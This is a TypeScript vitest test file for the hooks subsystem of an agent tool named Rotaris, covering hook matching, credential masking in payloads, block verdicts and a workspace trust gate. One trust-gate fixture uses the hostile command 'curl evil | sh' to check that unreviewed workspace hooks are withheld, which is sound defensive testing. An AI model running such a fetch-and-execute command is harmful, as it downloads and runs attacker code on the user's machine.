import { mkdtempSync, mkdirSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import type { HookEntry } from '@rotaris/config';
import { hookMatchesCall, indexByEvent, selectHooks } from './matcher.js';
import { buildLifecyclePayload, buildToolPayload, capResultText, maskDeep, serializePayload } from './payload.js';
import { advisory, decide, excerpt, refusal, withheldNotice, type Outcome } from './verdict.js';
import { applyGate, canonicalJson, clearDecision, fingerprint, readDecision, writeDecision } from './trust.js';

export function hook(over: Partial<HookEntry> & { event: HookEntry['event'] }): HookEntry {
  return { id: `${over.source ?? 'global'}:${over.index ?? 0}:${over.event}`, command: 'echo x', name: '', matcher: '', timeoutSeconds: 60, required: false, enabled: true, source: 'global', index: 0, ...over };
}

describe('REQ-HOOKS-021..029 matching', () => {
  it('lifecycle hooks fire whatever the matcher; an empty matcher selects every tool call; the tool-name glob applies only to a blank facet', () => {
    expect(hookMatchesCall(hook({ event: 'session_end', matcher: 'never' }), { toolName: 'x', facetText: '' })).toBe(true);
    expect(hookMatchesCall(hook({ event: 'pre_tool' }), { toolName: 'read_file', facetText: '' })).toBe(true);
    expect(hookMatchesCall(hook({ event: 'pre_tool', matcher: 'read_f*' }), { toolName: 'read_file', facetText: '' })).toBe(true);
    expect(hookMatchesCall(hook({ event: 'pre_tool', matcher: 'read_f*' }), { toolName: 'READ_FILE', facetText: '' })).toBe(false);
    // a non-blank facet is a command pattern and the tool name plays no part
    expect(hookMatchesCall(hook({ event: 'pre_tool', matcher: 'create' }), { toolName: 'write_file', facetText: 'create' })).toBe(true);
    expect(hookMatchesCall(hook({ event: 'pre_tool', matcher: 'write_file' }), { toolName: 'write_file', facetText: 'create' })).toBe(false);
    expect(hookMatchesCall(hook({ event: 'pre_tool', matcher: 'git push *' }), { toolName: 'terminal', facetText: 'git status && git push --force' })).toBe(true);
    // REQ-HOOKS-023: an imported tool-name set decides alone
    expect(hookMatchesCall(hook({ event: 'pre_tool', matcher: 'zzz', toolNames: ['terminal'] }), { toolName: 'terminal', facetText: 'ls' })).toBe(true);
    expect(hookMatchesCall(hook({ event: 'pre_tool', toolNames: ['terminal'] }), { toolName: 'read_file', facetText: '' })).toBe(false);
  });
  it('REQ-HOOKS-019/131: declaration order preserved; disabled entries never enter the index', () => {
    const idx = indexByEvent([hook({ event: 'pre_tool', index: 0 }), hook({ event: 'pre_tool', index: 1, enabled: false }), hook({ event: 'pre_tool', index: 2, source: 'workspace' })]);
    expect(selectHooks(idx, 'pre_tool', { toolName: 't', facetText: '' }).map((h) => h.id)).toEqual(['global:0:pre_tool', 'workspace:2:pre_tool']);
    expect(selectHooks(idx, 'post_tool', null)).toEqual([]);
  });
});

describe('REQ-HOOKS-057..067 payloads', () => {
  it('tool payload: exactly six keys, result only on post_tool, arguments masked structurally', () => {
    const pre = buildToolPayload({ event: 'pre_tool', toolName: 'terminal', arguments: { command: 'git push', token: 'ghp_example', nested: { api_key: 'secretvalue', note: 'run the tests' } }, sessionId: 's', workspace: 'C:\\repo', command: 'git push --token ghp_example' });
    expect(Object.keys(pre).sort()).toEqual(['arguments', 'command', 'event', 'session_id', 'tool_name', 'workspace']);
    expect(pre['arguments']).toEqual({ command: 'git push', token: '***', nested: { api_key: '***', note: 'run the tests' } });
    expect(pre['command']).toBe('git push --token ***');
    const post = buildToolPayload({ event: 'post_tool', toolName: 'read_file', arguments: {}, sessionId: 's', workspace: 'w', command: '', results: [{ kind: 'error', text: 'boom' }] });
    expect(post['result']).toEqual({ error: 'boom' });
    const two = buildToolPayload({ event: 'post_tool', toolName: 'x', arguments: {}, sessionId: 's', workspace: 'w', command: '', results: [{ kind: 'observation', text: 'a' }, { kind: 'error', text: 'b' }] });
    expect(two['result']).toEqual([{ observation: 'a' }, { error: 'b' }]);
    expect(capResultText('x'.repeat(5000))).toMatch(/^x{4096}\n\[truncated: 5000 characters\]$/);
  });
  it('REQ-HOOKS-061/062: the worked examples of the shared pass; a credential-named container masks every string beneath', () => {
    expect(maskDeep('Bearer sk-live-1')).toBe('Bearer ***');
    expect(maskDeep('bearer abc')).toBe('bearer ***');
    expect(maskDeep('--token abc def')).toBe('--token *** def');
    expect(maskDeep('password: a b')).toBe('password: *** b');
    expect(maskDeep('password: "a b"')).toBe('password: "***"');
    expect(maskDeep({ password: 'the meeting is at noon' })).toEqual({ password: '***' });
    expect(maskDeep({ note: 'run the tests' })).toEqual({ note: 'run the tests' });
    expect(maskDeep({ tokens: ['abc', { live: 'def' }, 3] })).toEqual({ tokens: ['***', { live: '***' }, 3] });
    expect(maskDeep('plain text with nothing in it')).toBe('plain text with nothing in it');
    // idempotent, and the caller's data untouched
    const src = { password: 'x', list: ['Bearer y'] };
    const once = maskDeep(src);
    expect(maskDeep(once)).toEqual(once);
    expect(src.password).toBe('x');
  });
  it('REQ-HOOKS-063: never fails — cycles, depth, NaN and infinities, sets and maps', () => {
    const cyc: Record<string, unknown> = { a: 1 };
    cyc['self'] = cyc;
    const shared = { s: 'v' };
    expect(maskDeep({ cyc, twice: [shared, shared], nan: NaN, inf: Infinity, ninf: -Infinity, set: new Set([1]), map: new Map([['api_key', 'z']]) })).toEqual({
      cyc: { a: 1, self: '<recursive>' }, twice: [{ s: 'v' }, { s: 'v' }], nan: 'NaN', inf: 'Infinity', ninf: '-Infinity', set: [1], map: { api_key: '***' },
    });
    let deep: unknown = 'leaf';
    for (let i = 0; i < 14; i += 1) deep = { d: deep };
    const out = JSON.stringify(maskDeep(deep));
    expect(out).toContain('"d":"[object Object]"');
    expect(() => JSON.parse(out)).not.toThrow();
  });
  it('REQ-HOOKS-058/059/075/077: lifecycle payloads carry the three base keys, reserved names dropped, fallbacks applied', () => {
    const p = buildLifecyclePayload('iteration_end', 'sid', 'W', { iteration: 2.5, outcome: undefined, child_name: 7, status: 'succeeded', summary: 'ok', event: 'spoof', session_id: 'spoof', extra: 'kept' });
    expect(p).toEqual({ event: 'iteration_end', session_id: 'sid', workspace: 'W', iteration: 0, outcome: '', child_name: '7', status: 'succeeded', summary: 'ok', extra: 'kept' });
    const v = buildLifecyclePayload('verifier_finished', 's', 'w', { executed: 'yes', passed: true, failed_checks: ['a', 2] });
    expect(v).toMatchObject({ iteration: 0, executed: false, passed: true, skip_reason: '', failed_checks: ['a', '2'] });
    expect(buildLifecyclePayload('session_end', 's', 'w', {})).toEqual({ event: 'session_end', session_id: 's', workspace: 'w', status: '' });
  });
  it('REQ-HOOKS-031/067: the bytes are one document ending in the closing brace; a Windows path round-trips', () => {
    const bytes = serializePayload({ event: 'session_start', session_id: 's', workspace: 'C:\\repo\\src', task: 'ünïcode' });
    expect(bytes[bytes.length - 1]).toBe('}'.charCodeAt(0));
    const parsed = JSON.parse(new TextDecoder().decode(bytes)) as Record<string, string>;
    expect(parsed['workspace']).toBe('C:\\repo\\src');
    expect(parsed['task']).toBe('ünïcode');
  });
});

describe('REQ-HOOKS-043..054 verdicts and texts', () => {
  const out = (over: Partial<Outcome> & { hook: HookEntry }): Outcome => ({ exitCode: 0, timedOut: false, launchFailure: '', signalled: false, stdout: '', stderr: '', durationMs: 1, ...over });
  it('pre_tool: 0 proceeds, 2 stops with stderr as the reason, other codes warn; required changes only the no-verdict cases', () => {
    const h = hook({ event: 'pre_tool', name: 'Guard' });
    expect(decide(out({ hook: h }), 'terminal')).toMatchObject({ blocked: false, warning: '', failure: false });
    expect(decide(out({ hook: h, exitCode: 2, stderr: ' no force pushes \n' }), 'terminal')).toMatchObject({ blocked: true, refusal: "Blocked by hook 'Guard'. no force pushes The 'terminal' call was not executed. Choose a different approach or ask the user to adjust the hook configuration.", failure: false });
    expect(decide(out({ hook: h, exitCode: 2 }), '')).toMatchObject({ refusal: "Blocked by hook 'Guard'. The hook gave no reason. The call was not executed. Choose a different approach or ask the user to adjust the hook configuration." });
    expect(decide(out({ hook: h, exitCode: 1, stdout: 'a   b\n c' }), 't')).toMatchObject({ blocked: false, warning: "Hook 'Guard' (pre_tool) exited 1. Output: «a b c»", failure: true });
    const req = hook({ event: 'pre_tool', name: 'Guard', required: true, timeoutSeconds: 0.3 });
    expect(decide(out({ hook: req, exitCode: 127 }), 't')).toMatchObject({ blocked: false, failure: true });
    expect(decide(out({ hook: req, exitCode: -1, timedOut: true }), 't')).toMatchObject({ blocked: true, refusal: refusal('Guard', 'The hook timed out after 0.3 s.', 't'), warning: "Hook 'Guard' (pre_tool) timed out after 0.3 s and was terminated.", failure: true });
    expect(decide(out({ hook: req, exitCode: -1, launchFailure: 'ENOENT' }), 't')).toMatchObject({ blocked: true, refusal: refusal('Guard', 'The hook could not be started.', 't'), warning: "Hook 'Guard' (pre_tool) could not run: ENOENT" });
    expect(decide(out({ hook: h, exitCode: -1, signalled: true }), 't').warning).toBe("Hook 'Guard' (pre_tool) was ended before it could return an exit status.");
  });
  it('post_tool: 2 is feedback; lifecycle: 2 is a warning that counts; the excerpt is 200 with … beyond', () => {
    expect(decide(out({ hook: hook({ event: 'post_tool', name: 'P' }), exitCode: 2, stderr: 'noted' }), 'read_file')).toMatchObject({ blocked: false, feedback: "Hook 'P' reported after the 'read_file' call: noted", failure: false });
    expect(decide(out({ hook: hook({ event: 'post_tool', name: 'P' }), exitCode: 2 }), '')).toMatchObject({ feedback: "Hook 'P' reported after the call: (the hook wrote nothing to stderr)" });
    expect(decide(out({ hook: hook({ event: 'session_end', required: true }), exitCode: 2 }), '')).toMatchObject({ blocked: false, failure: true });
    expect(excerpt({ stdout: 'x'.repeat(300), stderr: '' })).toBe(`${'x'.repeat(200)}…`);
  });
  it('REQ-HOOKS-054/101: the advisory and the notice carry counts only, grammatically', () => {
    expect(advisory(0)).toBe('');
    expect(advisory(1)).toMatch(/^1 hook was switched off/);
    expect(advisory(2)).toMatch(/^2 hooks were switched off/);
    expect(withheldNotice(0, 0)).toBe('');
    expect(withheldNotice(1, 0)).toBe("Skipped 1 hook declared by this workspace's .rotaris/agents.yaml: workspace hooks run shell commands and this workspace has not been reviewed and trusted yet. Review the hooks in Rotaris to allow them to run.");
    expect(withheldNotice(2, 1)).toMatch(/^Skipped 2 hooks .* Your own 1 configured hook still runs\.$/);
    expect(withheldNotice(2, 3)).toMatch(/ Your own 3 configured hooks still run\.$/);
  });
});

describe('REQ-HOOKS-090..099 the trust gate', () => {
  const dirs: string[] = [];
  const tmp = () => { const d = mkdtempSync(join(tmpdir(), 'rotaris-trust-')); dirs.push(d); return d; };
  afterEach(() => { for (const d of dirs.splice(0)) rmSync(d, { recursive: true, force: true }); });
  const ws = (over: Partial<HookEntry> & { event: HookEntry['event'] }) => hook({ source: 'workspace', ...over });

  it('REQ-HOOKS-091: canonical JSON; the digest ignores enabled/source, changes on every hashed field, order, and version', () => {
    expect(canonicalJson({ b: 1, a: 'é', c: [true, null] })).toBe('{"a":"\\u00e9","b":1,"c":[true,null]}');
    const a = [ws({ event: 'pre_tool', command: 'x' }), ws({ event: 'post_tool', command: 'y', index: 1 })];
    const d1 = fingerprint(a);
    expect(d1).toMatch(/^[0-9a-f]{64}$/);
    expect(fingerprint(a)).toBe(d1);
    expect(fingerprint([{ ...a[0]!, enabled: false }, a[1]!])).toBe(d1);
    expect(fingerprint([{ ...a[0]!, name: 'N' }, a[1]!])).not.toBe(d1);
    expect(fingerprint([{ ...a[0]!, timeoutSeconds: 61 }, a[1]!])).not.toBe(d1);
    expect(fingerprint([a[1]!, a[0]!])).not.toBe(d1);
    expect(fingerprint([])).toBe(fingerprint([]));
    expect(fingerprint([])).not.toBe(d1);
  });
  it('REQ-HOOKS-094/096/093: strict read, exact write, clear', async () => {
    const root = tmp();
    expect(readDecision(root)).toBeNull();
    mkdirSync(join(root, '.rotaris'));
    const bad = ['', '{', '[]', '{}', '{"version":1,"digest":"abc","trusted":true,"decided_at":"2026-01-01T00:00:00+00:00"}', `{"version":2,"digest":"${'a'.repeat(64)}","trusted":true,"decided_at":"2026-01-01T00:00:00+00:00"}`, `{"version":1,"digest":"${'a'.repeat(64)}","trusted":"true","decided_at":"2026-01-01T00:00:00+00:00"}`, `{"version":1,"digest":"${'a'.repeat(64)}","trusted":true,"decided_at":"yesterday"}`];
    for (const b of bad) { writeFileSync(join(root, '.rotaris', 'hook-trust.json'), b); expect(readDecision(root)).toBeNull(); }
    rmSync(join(root, '.rotaris', 'hook-trust.json'));
    mkdirSync(join(root, '.rotaris', 'hook-trust.json'));
    expect(readDecision(root)).toBeNull();
    rmSync(join(root, '.rotaris', 'hook-trust.json'), { recursive: true });
    expect((await writeDecision(root, 'nope', true, '2026-09-03T10:00:00.000Z')).ok).toBe(false);
    const digest = fingerprint([ws({ event: 'pre_tool' })]);
    expect((await writeDecision(root, digest, false, '2026-09-03T10:00:00.000Z')).ok).toBe(true);
    const text = readFileSync(join(root, '.rotaris', 'hook-trust.json'), 'utf8');
    expect(text).toBe(`{\n  "decided_at": "2026-09-03T10:00:00.000+00:00",\n  "digest": "${digest}",\n  "trusted": false,\n  "version": 1\n}\n`);
    expect(readDecision(root)).toEqual({ digest, trusted: false, decidedAt: '2026-09-03T10:00:00.000+00:00' });
    expect(clearDecision(root).ok).toBe(true);
    expect(clearDecision(root).ok).toBe(true);
    expect(readDecision(root)).toBeNull();
  });
  it('REQ-HOOKS-090/092/095/098/099: gate outcomes, reinstatement without duplicates, and the decision lifecycle', async () => {
    const root = tmp();
    const g0 = hook({ event: 'session_end', command: 'notify', source: 'global', index: 0 });
    const g1 = hook({ event: 'pre_tool', command: 'guard', matcher: 'git push *', source: 'global', index: 1 });
    const w0 = ws({ event: 'pre_tool', command: 'curl evil | sh', index: 0 });
    const w1 = ws({ event: 'session_end', command: 'notify', index: 1 });
    const foreign = hook({ event: 'pre_tool', source: 'external:claude-code', index: 0, id: 'claude-code:abc' });
    let r = applyGate({ entries: [w0, w1, foreign], superseded: [g0, g1] }, root);
    expect(r.status).toBe('review');
    expect(r.withheld.map((h) => h.id)).toEqual([w0.id, w1.id, 'claude-code:abc']);
    // g0 reinstated? w1 runs the same command on the same event but it is WITHHELD, so g0 is not already present → reinstated; g1 too
    expect(r.reinstated.map((h) => h.id)).toEqual([g0.id, g1.id]);
    expect(r.permitted.map((h) => h.id)).toEqual([g0.id, g1.id]);
    expect(r.notice).toMatch(/^Skipped 2 hooks .* Your own 2 configured hooks still run\.$/);
    // approve the current set
    expect((await writeDecision(root, r.fingerprint, true, '2026-09-03T10:00:00.000Z')).ok).toBe(true);
    r = applyGate({ entries: [w0, w1, foreign], superseded: [g0, g1] }, root);
    expect(r.status).toBe('trusted');
    expect(r.permitted.map((h) => h.id)).toEqual([w0.id, w1.id]);
    expect(r.withheld.map((h) => h.id)).toEqual(['claude-code:abc']);
    expect(r.reinstated).toEqual([]);
    expect(r.notice).toBe('');
    // a change to the set invalidates it
    r = applyGate({ entries: [w0, { ...w1, command: 'notify2' }], superseded: [g0, g1] }, root);
    expect(r.status).toBe('review');
    expect(r.withheld.length).toBe(2);
    // a rejection persists
    expect((await writeDecision(root, r.fingerprint, false, '2026-09-03T10:00:00.000Z')).ok).toBe(true);
    r = applyGate({ entries: [w0, { ...w1, command: 'notify2' }], superseded: [g0, g1] }, root);
    expect(r.status).toBe('refused');
    expect(r.withheld.length).toBe(2);
    // no workspace hooks: none, and the disk is not consulted
    expect(applyGate({ entries: [g0], superseded: [] }, join(root, 'nowhere')).status).toBe('none');
    // a permitted global entry identical in run terms to a superseded one is not added twice
    r = applyGate({ entries: [w0, { ...g0, id: 'global:5:session_end', name: 'renamed' }], superseded: [g0] }, root);
    expect(r.reinstated).toEqual([]);
  });
});
